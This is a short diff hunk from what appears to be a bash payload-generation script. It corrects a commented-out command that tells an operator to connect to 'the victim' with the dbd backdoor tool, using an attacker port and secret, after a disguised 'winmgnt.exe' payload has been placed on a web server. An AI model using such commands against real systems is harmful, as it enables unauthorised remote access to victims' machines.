@@ -387,7 +387,7 @@ do
 #		echo -e "\e[1;34mDone! Your payload is located at /var/www/html/winmgnt.exe\e[0m"
 #		echo ""
 #		echo -e "\e[1;34mWhen you are ready to connect to the victim, in your terminal enter:\e[0m"
-#		echo "dbd -nv victim.host.orip $attackerport -k $attackersecret"
+#		echo "dbd -nv victim.host.orip -p $attackerport -k $attackersecret"
 #		echo ""
 #		read -p "Press any key to contiue" enter
 #		clear
